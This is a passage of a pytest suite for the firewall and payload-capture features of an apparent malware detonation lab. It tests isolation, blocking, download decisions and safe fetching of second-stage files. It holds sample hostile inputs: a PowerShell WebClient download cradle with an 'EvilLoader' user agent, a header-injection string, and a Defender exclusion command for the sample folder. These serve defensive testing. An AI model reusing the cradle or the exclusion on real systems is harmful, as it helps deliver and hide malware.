    client.post("/api/firewall/isolate", json={"on": True})
    held, _ = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    out = tdc._fetch_capture(FINDING)
    assert out["sha256"] and out["allow_closed"] is False
    assert "another fetch" in out["close_problem"] and all(n in fw.run.rules for n in held)
    assert tdc._fw_close_fetch_path(held) == ([], False) and not any(n in fw.run.rules for n in held)


def test_no_powershell_runs_while_the_fetch_path_lock_is_held(client, fw, tdc, monkeypatch):
    """The collector takes that lock at every sweep, so nothing may hold it across a PowerShell call."""
    import threading
    free = []

    def watch(args):
        seen = []

        def probe():                     # from another thread: for this one the lock is re-entrant
            got = tdc._fw_fetch_cond.acquire(timeout=0.5)
            if got:
                tdc._fw_fetch_cond.release()
            seen.append(got)
        prober = threading.Thread(target=probe)
        prober.start()
        prober.join(5)
        free.append(bool(seen) and seen[0])
        return fw.run(args)
    monkeypatch.setattr(tdc, "_fw_runner", watch)
    client.post("/api/firewall/isolate", json={"on": True})
    names, _ = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    assert tdc._fw_close_fetch_path(names) == ([], False)
    monkeypatch.setattr(tdc, "_fw_fetch_swept", 0.0)
    tdc._firewall_sweep(now=time.time())
    assert free and all(free)                      # every call found the lock free


def test_the_sweep_leaves_a_rule_a_running_fetch_still_needs(client, fw, tdc, monkeypatch):
    client.post("/api/firewall/isolate", json={"on": True})
    monkeypatch.setattr(tdc, "_fw_fetch_swept", 0.0)
    names, _ = tdc._fw_open_fetch_path("203.0.113.50", 8080)
    tdc._firewall_sweep(now=time.time())
    assert all(n in fw.run.rules for n in names) and tdc._fw_isolate_state()["fetches_in_flight"] == 1
    assert tdc._fw_close_fetch_path(names) == ([], False)


def test_the_sweep_removes_a_per_fetch_rule_no_fetch_is_using(client, fw, tdc, monkeypatch):
    client.post("/api/firewall/isolate", json={"on": True})
    monkeypatch.setattr(tdc, "_fw_fetch_swept", 0.0)
    forgotten = tdc.firewall_rules.fetch_rule_name("198.51.100.9", 443, tdc._fw_fetcher_paths()[0])
    fw.run.rules[forgotten] = fw.run.view(forgotten, Action="Allow", Program=tdc._fw_fetcher_paths()[0])
    tdc._firewall_sweep(now=time.time())
    assert forgotten not in fw.run.rules


def test_the_fetch_budget_covers_the_checks_and_the_rule_too(client, fw, tdc, monkeypatch):
    seen = {}
    real = tdc.firewall_fetch.fetch

    def watching(*args, **kwargs):
        seen["timeout"] = kwargs["timeout"]
        return real(*args, **kwargs)
    monkeypatch.setattr(tdc.firewall_fetch, "fetch", watching)
    monkeypatch.setattr(tdc, "_fw_open_fetch_path", lambda ip, port: (time.sleep(0.2), ((), None))[1])
    assert tdc._fetch_capture(FINDING)["sha256"]
    assert 0 < seen["timeout"] <= tdc.FETCH_TIMEOUT - 0.2


@pytest.mark.parametrize("body", [
    {"scope": "world", "image": IMAGE}, {"scope": "process"}, {"scope": "process", "image": IMAGE, "ip": "1.2.3.4"},
    {"scope": "endpoint", "ip": "1.2.3.4"}, {"scope": "endpoint", "image": IMAGE},
    {"scope": "endpoint_all", "ip": "1.2.3.4", "image": IMAGE}, {"scope": "endpoint_all"},
    {"scope": "endpoint", "image": IMAGE, "ip": "1.2.3.4", "port": "443"},
    {"scope": "endpoint", "image": IMAGE, "ip": "1.2.3.4", "port": True},
    {"scope": "process", "image": IMAGE, "bogus": 1}, {"image": IMAGE},
])
def test_block_refuses_a_malformed_request_before_it_touches_the_firewall(client, fw, body):
    assert client.post("/api/firewall/block", json=body).status_code == 400
    assert fw.run.calls == []


def test_block_on_the_loopback_for_everyone_is_refused(client, fw):
    r = client.post("/api/firewall/block", json={"scope": "endpoint_all", "ip": "127.0.0.1"})
    assert r.status_code == 409 and "loopback" in r.json["error"].lower() and fw.run.rules == {}


def test_block_refuses_while_the_firewall_is_off(client, fw):
    fw.profiles = {"Domain": True, "Private": False, "Public": True}
    r = client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
    assert r.status_code == 409 and "firewall" in r.json["error"].lower()
    assert fw.run.rules == {}


def test_block_that_cannot_be_verified_is_not_a_success(client, fw, monkeypatch):
    monkeypatch.setattr(fw.run, "disable_new", True)
    r = client.post("/api/firewall/block", json={"scope": "process", "image": IMAGE})
    assert r.status_code == 409 and r.json["verified"] is False and r.json["error"]


def test_unblock_removes_every_rule_of_a_key(client, fw):
    a = client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "1.2.3.4", "port": 443,
                                                 "protocol": "tcp", "image": IMAGE}).json["rule_id"]
    b = client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "1.2.3.4", "port": 443,
                                                 "protocol": "udp", "image": IMAGE}).json["rule_id"]
    rules = client.get("/api/firewall/rules").json["rules"]
    assert {r["rule_id"] for r in rules} == {a, b} and rules[0]["key"] == rules[1]["key"]
    assert set(client.post("/api/firewall/unblock", json={"rule_id": a}).json["removed"]) == {a, b}
    assert client.get("/api/firewall/rules").json["rules"] == []


@pytest.mark.parametrize("body", [{}, {"rule_id": 3}, {"rule_id": "x", "y": 1}, {"rule_id": "Core Networking"},
                                  {"rule_id": "TDC-FW-*"}])
def test_unblock_takes_only_our_rule_ids(client, fw, body):
    assert client.post("/api/firewall/unblock", json=body).status_code == 400


def test_a_blocked_flow_shows_as_blocked(client, fw):
    fw.store.add_connections([conn()])
    assert client.get("/api/firewall/connections").json["connections"][0]["state"] == "allowed"
    client.post("/api/firewall/block", json={"scope": "endpoint", "ip": "203.0.113.50", "image": IMAGE})
    flow = client.get("/api/firewall/connections").json["connections"][0]
    assert flow["state"] == "blocked" and flow["rule_id"].startswith("TDC-FW-")


def test_connections_filters_and_the_cap(client, fw):
    fw.store.add_connections([conn(dst=f"203.0.113.{i}", port=4444, pid=i + 10) for i in range(1, 6)]
                             + [conn(dst="198.51.100.7", port=443, image=r"C:\y\edge.exe", pid=99)])
    assert client.get("/api/firewall/connections?max=2").json["truncated"] is True
    assert len(client.get("/api/firewall/connections?max=2").json["connections"]) == 2
    assert client.get("/api/firewall/connections?process=edge").json["count"] == 1
    assert client.get("/api/firewall/connections?tag=rare-port").json["count"] == 5
    assert client.get("/api/firewall/connections?state=blocked").json["count"] == 0
    assert client.get("/api/firewall/connections?state=bad").status_code == 400
    assert client.get("/api/firewall/connections?since=junk").status_code == 400
    assert client.get("/api/firewall/connections?until=2001-01-01T00:00:00Z").json["count"] == 0


def test_connections_still_answer_when_the_rules_cannot_be_read(client, fw, tdc, monkeypatch):
    monkeypatch.setattr(tdc, "_fw_runner", lambda args: (1, "", "powershell is gone"))
    fw.store.add_connections([conn()])
    out = client.get("/api/firewall/connections").json
    assert out["count"] == 1 and out["rules_error"]
    assert client.get("/api/firewall/rules").status_code == 500


def test_the_summary_counts(client, fw):
    fw.store.add_connections([conn(), conn(dst="198.51.100.7", port=443, pid=7)])
    out = client.get("/api/firewall/summary").json
    assert out["connections"] == 2 and out["open_decisions"] == 0 and out["captures_total"] == 0
    assert "bytes_note" in out and out["top_endpoints"]


# ---- the sweep: what becomes a decision --------------------------------------------------------


def test_a_download_in_a_detonation_is_blocked_first_and_asked_after(client, fw, tdc, monkeypatch):
    seed(fw)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    (item,) = fw.pending.open()
    assert item["finding"]["url"] == URL and item["result"]["block"]["verified"] is True
    assert any("TDC-FW-" in n for n in fw.run.rules)
    assert fw.fetches == []
    sweep(tdc)
    assert len(fw.pending.open()) == 1 and len(fw.run.rules) == 1               # no second decision, no second rule


def test_decide_seconds_zero_fetches_at_once(client, fw, tdc, monkeypatch):
    monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", "0")
    seed(fw)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    assert fw.pending.open() == [] and len(fw.fetches) == 1
    assert fw.pending.history(1)[0]["result"]["by"] == "deadline"
    assert client.get("/api/firewall/captures").json["captures"][0]["url"] == URL


def test_detonation_mode_needs_a_detonation(client, fw, tdc):
    seed(fw)
    sweep(tdc)
    assert fw.pending.open() == []


def test_all_mode_takes_any_process_that_is_not_tdcs_own(client, fw, tdc):
    client.post("/api/firewall/ask", json={"mode": "all"})
    seed(fw)
    seed(fw, url="http://198.51.100.9:8081/x.exe", dst="198.51.100.9", port=8081,
         image=r"C:\DetonationChamberUI\venv\Scripts\python.exe", pid=77)
    sweep(tdc)
    assert [i["finding"]["dst_ip"] for i in fw.pending.open()] == ["203.0.113.50"]


def test_off_marks_but_neither_asks_nor_blocks(client, fw, tdc, monkeypatch):
    client.post("/api/firewall/ask", json={"mode": "off"})
    seed(fw)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    assert fw.pending.open() == [] and fw.run.calls == []
    flow = client.get("/api/firewall/connections").json["connections"][0]
    assert "download" in flow["tags"]


def test_an_update_cdn_is_marked_and_never_a_decision(client, fw, tdc, monkeypatch):
    url = "http://download.windowsupdate.com:8080/msdownload/update/x.exe"
    fw.store.add_dns([{"timestamp": iso(-6), "event_id": 22, "pid": "4812", "image": IMAGE,
                       "query": "download.windowsupdate.com", "result": "203.0.113.60", "status": "0"}])
    seed(fw, url=url, dst="203.0.113.60", port=8080)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    assert fw.pending.open() == [] and fw.run.calls == []
    assert "download" in client.get("/api/firewall/connections").json["connections"][0]["tags"]


def test_user_content_on_github_is_not_exempt():
    assert not firewall.is_update_host("raw.githubusercontent.com")
    assert not firewall.is_update_host("github.com")
    assert firewall.is_update_host("a.b.download.windowsupdate.com")


@pytest.mark.parametrize("host, update", [
    ("windowsupdate.com", True), ("WindowsUpdate.COM", True), ("download.windowsupdate.com.", True),
    ("sls.update.microsoft.com", True), ("windowsupdate.com.evil.example", False),
    ("notwindowsupdate.com", False), ("evil-windowsupdate.com", False), ("203.0.113.50", False),
    ("::1", False), ("", False), (None, False), ("microsoft.com", False),
])
def test_an_update_host_matches_itself_or_a_subdomain_and_an_address_never(host, update):
    assert firewall.is_update_host(host) is update


def test_a_detonated_loader_cannot_hide_behind_a_path_that_looks_like_tdcs(client, fw, tdc, monkeypatch):
    curl = r"C:\Program Files\Git\mingw64\bin\curl.exe"       # Git ships it, and the sample chose that path
    seed(fw, url="http://203.0.113.50:8080/s2.exe", image=curl)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    (item,) = fw.pending.open()
    assert item["finding"]["self"] is True and item["finding"]["image"] == curl
    assert item["result"]["block"]["verified"] is True


def test_outside_a_detonation_tdcs_own_programs_are_still_left_alone(client, fw, tdc):
    client.post("/api/firewall/ask", json={"mode": "all"})
    seed(fw, url="http://203.0.113.50:8080/s2.exe", image=r"C:\Program Files\Git\mingw64\bin\curl.exe")
    sweep(tdc)
    assert fw.pending.open() == [] and fw.run.calls == []


def test_what_the_web_ui_started_is_not_asked_about(client, fw, tdc, monkeypatch):
    client.post("/api/firewall/ask", json={"mode": "all"})
    fw.store.add_processes([{"timestamp": iso(-60), "event_id": 1, "pid": "4812", "image": r"C:\Windows\powershell.exe",
                             "commandline": "update", "parent_pid": str(os.getpid()), "parent_image": "python.exe"}])
    seed(fw)
    sweep(tdc)
    assert fw.pending.open() == []


def test_an_old_finding_is_marked_but_no_longer_asked(client, fw, tdc, monkeypatch):
    fw.store.add_connections([conn(t=-7200)])
    fw.store.add_powershell([script(t=-7190)])
    open_window(monkeypatch, tdc)
    sweep(tdc)
    assert fw.pending.open() == []
    assert (4812, "203.0.113.50", 8080) in tdc._fw_downloads


def test_a_second_sweep_cannot_ask_again_for_a_decided_finding(client, fw, tdc, monkeypatch):
    monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", "0")
    seed(fw)
    open_window(monkeypatch, tdc)
    sweep(tdc)
    sweep(tdc)
    assert len(fw.fetches) == 1


def test_a_failing_scan_does_not_stop_the_expired_decisions(client, fw, tdc, monkeypatch):
    monkeypatch.setattr(tdc, "_fw_scan_downloads", lambda now: 1 / 0)
    fw.pending.add(FINDING, deadline=time.time() - 1)
    sweep(tdc)
    assert len(fw.fetches) == 1


def test_the_decide_seconds_setting(monkeypatch, tdc):
    for raw, want in (("45", 45.0), ("0", 0.0), ("nan", 30.0), ("inf", 30.0), ("-3", 30.0), ("junk", 30.0),
                      ("999999", 3600.0)):
        monkeypatch.setenv("TDC_FIREWALL_DECIDE_SECONDS", raw)
        assert tdc._firewall_decide_seconds() == want
    monkeypatch.delenv("TDC_FIREWALL_DECIDE_SECONDS")
    assert tdc._firewall_decide_seconds() == 30.0


# ---- detonation windows ----------------------------------------------------------------------


def _sub(sub_id, pid, ago):
    return {"id": sub_id, "agent_pid": pid, "timestamp": datetime.fromtimestamp(time.time() - ago).isoformat()}


def test_only_open_detonation_windows_are_submission_pids(fw, tdc, monkeypatch):
    now = time.time()
    monkeypatch.setattr(tdc, "_load_submissions", lambda: [
        _sub("old", 100, 7200),            # two hours ago, its process is gone
        _sub("running", 200, 7200),        # old, but still running
        _sub("fresh", 300, 20),            # a second ago, the process already ended
        _sub("ended", 400, 600),
    ])
    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 7200 if pid == 200 else None)
    assert tdc._firewall_open_windows(now) == {200: "running", 300: "fresh"}
    monkeypatch.setattr(tdc, "_fw_windows_cache", (0.0, {}))
    assert tdc._firewall_open_windows(now + 200) == {200: "running"}


def test_a_window_stays_open_for_a_minute_after_its_process_ended(fw, tdc, monkeypatch):
    now = time.time()
    monkeypatch.setattr(tdc, "_load_submissions", lambda: [_sub("s", 200, 3600)])
    alive = {"on": True}
    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 3600 if alive["on"] else None)
    assert 200 in tdc._firewall_open_windows(now)
    alive["on"] = False
    monkeypatch.setattr(tdc, "_fw_windows_cache", (0.0, {}))
    assert 200 in tdc._firewall_open_windows(now + 30)
    monkeypatch.setattr(tdc, "_fw_windows_cache", (0.0, {}))
    assert tdc._firewall_open_windows(now + 90) == {}


def test_a_reused_pid_is_not_the_submission(fw, tdc, monkeypatch):
    now = time.time()
    monkeypatch.setattr(tdc, "_load_submissions", lambda: [_sub("s", 200, 7200)])
    monkeypatch.setattr(tdc, "_process_started_at", lambda pid: now - 10)       # started long after the submission
    assert tdc._firewall_open_windows(now) == {}


# ---- the fetch -------------------------------------------------------------------------------


def test_a_fetch_connects_to_the_observed_address_and_resolves_nothing(fw, tdc):
    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
    assert out["sha256"] and fw.lookups == []
    (call,) = fw.fetches
    assert call["ip"] == "203.0.113.50" and call["port"] == 8080 and call["scheme"] == "http"
    assert call["headers"]["Host"] == "stage.example.net:8080" and call["target"] == "/a.dll"


def test_a_fetch_over_tls_names_the_host(fw, tdc):
    out = tdc._fetch_capture({**FINDING, "url": "https://stage.example.net/a.dll?x=1", "dst_port": 443})
    (call,) = fw.fetches
    assert out["sha256"] and call["scheme"] == "https" and call["host"] == "stage.example.net"
    assert call["port"] == 443 and call["target"] == "/a.dll?x=1" and call["headers"]["Host"] == "stage.example.net"


def test_the_loaders_user_agent_is_sent_and_recorded(fw, tdc):
    fw.store.add_powershell([script(text=f"$w=New-Object Net.WebClient;$w.Headers.Add('User-Agent','EvilLoader/1.0');"
                                         f"$w.DownloadFile('{URL}','a.dll')")])
    out = tdc._fetch_capture(FINDING)
    assert fw.fetches[0]["headers"]["User-Agent"] == "EvilLoader/1.0"
    assert out["user_agent"] == "EvilLoader/1.0" and out["user_agent_source"] == "loader"


def test_a_neutral_user_agent_when_the_loader_names_none(fw, tdc):
    out = tdc._fetch_capture(FINDING)
    assert out["user_agent"] == tdc.FETCH_DEFAULT_UA and out["user_agent_source"] == "default"
    assert fw.fetches[0]["headers"]["User-Agent"] == tdc.FETCH_DEFAULT_UA


@pytest.mark.parametrize("agent", ["Evil\r\nX-Injected: 1", "Ünicode/1", "a" * 400])
def test_a_user_agent_that_could_split_a_header_is_not_used(fw, tdc, agent):
    fw.store.add_powershell([script(text=f"Invoke-WebRequest '{URL}' -UserAgent '{agent}'")])
    out = tdc._fetch_capture(FINDING)
    assert out["user_agent_source"] == "default"


def test_a_redirect_on_the_same_address_is_followed(fw, tdc):
    fw.script = [(302, {"Location": "/real/a.dll"}, b"")]
    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
    assert out["sha256"] and out["redirects"] == 1
    assert [c["target"] for c in fw.fetches] == ["/a.dll", "/real/a.dll"]
    assert {c["ip"] for c in fw.fetches} == {"203.0.113.50"}


def test_a_redirect_to_another_host_is_refused(fw, tdc):
    fw.script = [(302, {"Location": "http://other.example.org:8080/a.dll"}, b"")]
    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
    assert "leaves the observed address" in out["error"] and len(fw.fetches) == 1 and fw.lookups == []


def test_a_redirect_to_another_address_literal_is_refused(fw, tdc):
    fw.script = [(301, {"Location": "http://198.51.100.1:8080/a.dll"}, b"")]
    assert "error" in tdc._fetch_capture(FINDING) and len(fw.fetches) == 1


@pytest.mark.parametrize("location, why", [
    ("http://stage.example.net:8081/a.dll", "another port"),
    ("https://stage.example.net:8080/a.dll", "scheme"),
])
def test_a_redirect_that_changes_the_port_or_the_scheme_is_refused(fw, tdc, location, why):
    fw.script = [(302, {"Location": location}, b"")]
    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
    assert why in out["error"] and len(fw.fetches) == 1 and fw.lookups == []


def test_at_most_three_redirects(fw, tdc):
    fw.script = [(302, {"Location": f"/{i}"}, b"") for i in range(5)]
    out = tdc._fetch_capture({**FINDING, "url": "http://stage.example.net:8080/a.dll"})
    assert out["error"] == "too many redirects" and len(fw.fetches) == 4


@pytest.mark.parametrize("status", [403, 404, 500, 204])
def test_an_answer_that_is_not_a_file_stores_nothing(fw, tdc, status):
    fw.script = [(status, {}, b"nope")]
    out = tdc._fetch_capture(FINDING)
    assert out["error"] == f"HTTP {status}" and "sha256" not in out
    assert tdc._capture_store() == []


def test_an_empty_answer_stores_nothing(fw, tdc):
    fw.body = b""
    assert tdc._fetch_capture(FINDING)["error"] == "empty response" and tdc._capture_store() == []


def test_a_declared_size_over_the_limit_is_refused_before_reading(fw, tdc):
    fw.script = [(200, {"Content-Length": str(tdc.FETCH_MAX_BYTES + 1)}, b"MZ")]
    assert tdc._fetch_capture(FINDING)["error"] == "too large"


def test_the_whole_fetch_has_a_time_limit(fw, tdc, monkeypatch):
    monkeypatch.setattr(tdc, "FETCH_TIMEOUT", 0)
    assert tdc._fetch_capture(FINDING)["error"] == "timed out" and fw.fetches == []


@pytest.mark.parametrize("ip", ["127.0.0.1", "::1", "0.0.0.0", "224.0.0.1", "169.254.169.254", "::ffff:127.0.0.1",
                                "not-an-ip", None])
def test_the_vms_own_side_is_never_fetched_from(fw, tdc, ip):
    url = f"http://{ip}:8080/a.dll" if ip else URL
    out = tdc._fetch_capture({**FINDING, "dst_ip": ip, "url": url})
    assert out["error"] and fw.fetches == []


@pytest.mark.parametrize("ip", ["192.168.64.129", "192.168.64.1", "::ffff:192.168.64.1"])
def test_this_vms_own_address_and_its_gateway_are_refused_even_on_the_lan(fw, tdc, monkeypatch, ip):
    monkeypatch.setenv("TDC_FIREWALL_FETCH_LAN", "1")
    out = tdc._fetch_capture({**FINDING, "dst_ip": ip, "url": "http://stage.example.net:8080/a.dll"})
    assert "own address or its gateway" in out["error"] and fw.fetches == []


def test_a_private_address_needs_the_lab_switch(fw, tdc, monkeypatch):
    finding = {**FINDING, "dst_ip": "10.9.9.9", "url": "http://10.9.9.9:8080/a.dll"}
    out = tdc._fetch_capture(finding)
    assert "TDC_FIREWALL_FETCH_LAN" in out["error"] and fw.fetches == []
    monkeypatch.setenv("TDC_FIREWALL_FETCH_LAN", "1")
    assert tdc._fetch_capture(finding)["sha256"]


@pytest.mark.parametrize("url", ["ftp://203.0.113.50:8080/a.dll", "http://203.0.113.50:9999/a.dll", "javascript:1",
                                 "http:///a.dll", "http://203.0.113.50:8080/a b\r\nX: y", "x" * 9000, None, 5])
def test_a_url_that_does_not_match_the_observation_is_refused(fw, tdc, url):
    out = tdc._fetch_capture({**FINDING, "url": url})
    assert out["error"] and fw.fetches == []


def test_the_file_is_stored_by_hash_without_an_extension_and_is_not_touched_again(fw, tdc):
    fw.body = b"MZ\x90\x00" + b"\x01" * 64
    out = tdc._fetch_capture(FINDING)
    sha = out["sha256"]
    path = os.path.join(str(fw.samples), sha[:2], sha)
    assert out["path"] == path and open(path, "rb").read() == fw.body
    assert out["size"] == len(fw.body) and out["executed"] is False
    assert not os.listdir(os.path.join(str(fw.samples), ".incoming"))
    again = tdc._fetch_capture(FINDING)
    assert again["sha256"] == sha and len(tdc._capture_store()) == 2          # two fetches, one file, two records


@pytest.mark.parametrize("head, magic", [(b"MZ\x90", "MZ"), (b"\x7fELFxx", "ELF"), (b"PK\x03\x04x", "PK"),
                                         (b"#!/bin/sh", "#!"), (b"hello ok", "text"), (b"\x00\x01\x02\x03", "unknown")])
def test_the_magic_comes_from_the_first_bytes(fw, tdc, head, magic):
    fw.body = head + b"\x00" * 16 if magic in ("unknown",) else head + b" more"
    assert tdc._fetch_capture(FINDING)["magic"] == magic


def test_the_capture_carries_what_the_spec_lists(fw, tdc):
    fw.store.add_processes([{"timestamp": iso(-60), "event_id": 1, "pid": "4812", "image": IMAGE, "commandline": "",
                             "parent_pid": "900", "parent_image": "x"}])
    tdc._load_submissions = lambda: [{"id": "sub42", "agent_pid": 900, "timestamp": iso(-90)}]
    out = tdc._fetch_capture({**FINDING, "dst_ip": "203.0.113.50"})
    assert {"id", "sha256", "size", "url", "dst_ip", "geo", "pid", "image", "fetched_at", "origin", "content_type",
            "magic", "submission_id", "executed"} <= set(out)
    assert out["origin"] == "fetch" and out["submission_id"] == "sub42" and out["url"] == URL
    assert out["geo"]["scope"] == "public"


def test_the_capture_routes(client, fw, tdc):
    assert client.get("/api/firewall/capture/nope").status_code == 404
    one, two = tdc._fetch_capture(FINDING), tdc._fetch_capture({**FINDING, "url": URL + "?2"})
    listed = client.get("/api/firewall/captures").json["captures"]
    assert [c["id"] for c in listed] == [two["id"], one["id"]]
    detail = client.get("/api/firewall/capture/" + one["id"]).json
    assert detail["exists"] is True and detail["sha256"] == one["sha256"]
    os.remove(detail["path"])
    assert client.get("/api/firewall/capture/" + one["id"]).json["exists"] is False


def test_a_flow_lists_the_captures_of_its_endpoint(client, fw, tdc):
    fw.store.add_connections([conn()])
    cap = tdc._fetch_capture(FINDING)
    assert client.get("/api/firewall/connections").json["connections"][0]["capture_ids"] == [cap["id"]]
    assert client.get("/api/firewall/summary").json["captures"] == 1


def test_the_capture_store_keeps_500_entries_and_survives_a_damaged_file(fw, tdc):
    for i in range(tdc.MAX_CAPTURES + 3):
        tdc._record_capture({"sha256": "a" * 64, "url": f"http://x/{i}"})
    store = tdc._capture_store()
    assert len(store) == tdc.MAX_CAPTURES and store[-1]["url"].endswith(str(tdc.MAX_CAPTURES + 2))
    assert len({c["id"] for c in store}) == tdc.MAX_CAPTURES
    with open(tdc.CAPTURES_FILE, "w") as f:
        f.write("{not json")
    assert tdc._capture_store() == []
    assert tdc._record_capture({"sha256": "b" * 64})["id"]


def test_a_capture_is_readable_for_download_and_not_a_write_target(client, fw, tdc):
    out = tdc._fetch_capture(FINDING)
    assert tdc.CAPTURE_DIR in tdc._readable_roots()
    assert tdc._readable(out["path"])
    assert client.get("/api/file/download", query_string={"path": out["path"]}).status_code == 200
    assert not [n for n in dir(tdc) if "write_roots" in n.lower() or "writable_roots" in n.lower()]


# ---- the capture directory and its Defender exclusion ----------------------------------------


def test_the_capture_directory_is_created_and_excluded_from_defender(fw, tdc, tmp_path, monkeypatch):
    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(tmp_path / "new" / "samples"))
    calls = []
    assert tdc._ensure_capture_dir(lambda args: calls.append(args) or (0, "", "")) is True
    assert os.path.isdir(tdc.CAPTURE_DIR)
    (args,) = calls
    assert args[0].lower().endswith("powershell.exe") and "-Command" in args
    assert "Add-MpPreference -ExclusionPath" in args[-1] and tdc.CAPTURE_DIR in args[-1]
    assert tdc._ensure_capture_dir(lambda args: (0, "", "")) is True               # idempotent


def test_a_failing_exclusion_only_logs(fw, tdc, tmp_path, monkeypatch, caplog):
    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(tmp_path / "s"))
    assert tdc._ensure_capture_dir(lambda args: (1, "", "denied")) is False
    assert tdc._ensure_capture_dir(lambda args: 1 / 0) is False
    blocker = tmp_path / "file"
    blocker.write_text("x")
    monkeypatch.setattr(tdc, "CAPTURE_DIR", str(blocker / "sub"))
    assert tdc._ensure_capture_dir(lambda args: (0, "", "")) is False


def test_the_provisioning_script_excludes_the_capture_directory():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    text = open(os.path.join(root, "scripts", "install-webui.ps1"), encoding="utf-8").read()
    assert re.search(r'Add-MpPreference -ExclusionPath "C:\\tdc\\samples"', text)


def test_the_requirements_did_not_grow():
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    lines = [l.strip() for l in open(os.path.join(root, "webui", "requirements.txt")) if l.strip()]
    assert lines == ["flask>=3.0", "requests>=2.31", "watchdog>=4.0", "pefile>=2023.2.7"]


# ---- the readers -----------------------------------------------------------------------------


class _Proc:
    def __init__(self, text="", rc=0, err=b""):
        self.stdout, self.returncode, self.stderr = text.encode("utf-16-le"), rc, err


def _xml(record, eid=59, url="http://x.example/a.exe", pid=2000):
    return (f'<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><EventID>{eid}</EventID>'
            f'<TimeCreated SystemTime="2026-11-16T10:00:00.1234567Z"/><EventRecordID>{record}</EventRecordID>'
            f'<Execution ProcessID="{pid}"/><Security UserID="S-1-5-18"/></System><EventData>'
            f'<Data Name="name">job</Data><Data Name="Url">{url}</Data></EventData></Event>')


@pytest.fixture
def wevt(tdc, monkeypatch):
    seen = []
    answers = []

    def query(log, query=None, count=None, newest_first=True, timeout=30):
        seen.append({"log": log, "query": query, "count": count, "newest_first": newest_first})
        text = answers.pop(0) if answers else ""
        return text, _Proc(text)

    monkeypatch.setattr(tdc, "_wevtutil_query", query)
    monkeypatch.setattr(tdc, "_IS_WINDOWS", True)
    return type("W", (), {"seen": seen, "answers": answers})


def test_the_powershell_reader_reports_the_logs_newest_id_when_nothing_new_came_back(tdc, wevt):
    wevt.answers[:] = ["", _xml(777, eid=4104)]
    events, newest = tdc._fw_read_powershell(since=500)
    assert events == [] and newest == 777
    assert "EventRecordID>500" in wevt.seen[0]["query"] and wevt.seen[1]["count"] == 1 and wevt.seen[1]["newest_first"]


def test_a_cleared_powershell_log_is_visible_to_the_collector(tdc, wevt):
    wevt.answers[:] = ["", _xml(3, eid=4104)]
    _, newest = tdc._fw_read_powershell(since=900)
    assert newest == 3 < 900


def test_an_empty_log_reports_zero_and_the_first_read_is_the_last_day(tdc, wevt):
    wevt.answers[:] = ["", ""]
    assert tdc._fw_read_powershell(since=None)[1] == 0
    assert "timediff" in wevt.seen[0]["query"] and wevt.seen[0]["newest_first"] is True


def test_events_that_came_back_report_the_newest_of_them_not_the_log(tdc, wevt):
    wevt.answers[:] = [_xml(10, eid=4104) + _xml(12, eid=4104)]
    events, newest = tdc._fw_read_powershell(since=5)
    assert newest == 12 and len(wevt.seen) == 1 and events


def test_bits_events_carry_record_id_url_and_no_requester_pid(tdc, wevt):
    wevt.answers[:] = [_xml(31, 60, "http://a/b.exe") + _xml(30, 59)]
    events, newest = tdc._fw_read_bits(since=20)
    assert newest == 31 and [e["record_id"] for e in events] == [30, 31]
    assert events[0]["event_id"] == 59 and events[0]["data"]["url"] == "http://x.example/a.exe"
    assert "pid" not in events[0] and events[0]["timestamp"].startswith("2026-11-16T10:00:00")
    assert "(EventID=59 or EventID=60)" in wevt.seen[0]["query"]


def test_the_log_readers_say_why_they_fail(tdc, monkeypatch):
    monkeypatch.setattr(tdc, "_IS_WINDOWS", False)
    with pytest.raises(RuntimeError, match="only available on the VM"):
        tdc._fw_read_bits()
    monkeypatch.setattr(tdc, "_IS_WINDOWS", True)
    monkeypatch.setattr(tdc, "_wevtutil_query", lambda *a, **k: ("", type("P", (), {"stdout": b"", "returncode": 15007,
                                                                                    "stderr": b"The channel was not found."})()))
    with pytest.raises(RuntimeError, match="channel was not found"):
        tdc._fw_read_powershell(since=1)


def test_the_firewall_reader_always_answers_with_an_int_offset(tdc, monkeypatch):
    log = ("#Fields: date time action protocol src-ip dst-ip src-port dst-port size tcpflags tcpsyn tcpack tcpwin "
           "icmptype icmpcode info path pid\n"
           "2026-11-16 10:00:00 DROP TCP 10.0.2.15 203.0.113.50 51000 8080 60 S 1 0 64240 - - - SEND 4812\n")
    monkeypatch.setattr(tdc, "_read_firewall_log", lambda offset: (log, 321, ""))
    reader = tdc._FirewallLogReader()
    events, offset = reader(since=None)
    assert offset == 321 and isinstance(offset, int) and events[0]["fields"]["dst_ip"] == "203.0.113.50"
    monkeypatch.setattr(tdc, "_read_firewall_log", lambda offset: ("", 400, ""))
    assert reader(since=321) == ([], 400)
    monkeypatch.setattr(tdc, "_read_firewall_log", lambda offset: ("", None, "The firewall log does not exist yet"))
    with pytest.raises(RuntimeError, match="does not exist"):
        reader(since=400)


def test_the_readers_fit_the_collector(tdc, fw, monkeypatch):
    readers = tdc._firewall_readers()
    assert set(readers) == set(tdc.firewall_store.SOURCES)
    assert readers["connections"] is readers["dns"] is readers["processes"] is tdc._read_sysmon_for_logs
    calls = []
    monkeypatch.setattr(tdc, "_read_sysmon_events", lambda **kw: calls.append(kw) or [])
    monkeypatch.setattr(tdc, "_IS_WINDOWS", True)
    assert readers["dns"](event_ids=[22], since_iso="2026-11-16T10:00:00Z") == []
